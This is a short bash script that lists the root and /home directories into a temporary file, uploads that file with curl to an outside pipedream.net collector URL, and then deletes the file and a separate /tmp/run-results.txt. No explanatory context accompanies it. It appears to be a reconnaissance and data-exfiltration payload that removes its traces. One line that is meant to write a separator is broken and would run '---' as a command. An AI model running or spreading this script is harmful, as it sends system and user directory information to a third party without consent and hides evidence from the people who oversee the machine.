#!/bin/bash

ls -1la / > /tmp/file.txt
"---" >> /tmp/file.txt
ls -1la /home >> /tmp/file.txt


curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/

rm /tmp/file.txt
rm /tmp/run-results.txt
